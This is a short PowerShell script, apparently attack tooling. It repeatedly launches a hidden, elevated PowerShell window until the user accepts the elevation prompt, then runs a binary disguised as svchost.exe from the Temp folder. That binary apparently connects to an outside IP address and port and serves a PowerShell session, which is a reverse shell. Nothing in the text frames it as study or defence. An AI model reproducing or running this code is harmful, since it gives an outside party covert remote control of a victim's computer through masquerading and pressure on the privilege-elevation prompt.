while ($true) {
    $result = Start-Process powershell -windowstyle Hidden -Verb runAs -Wait -PassThru -ArgumentList 'cd $env:USERPROFILE\AppData\Local\Temp ; .\svchost.exe 66.228.37.7 1607 -e powershell'
    if ($result.ExitCode -eq 0) {
        break
    }
}
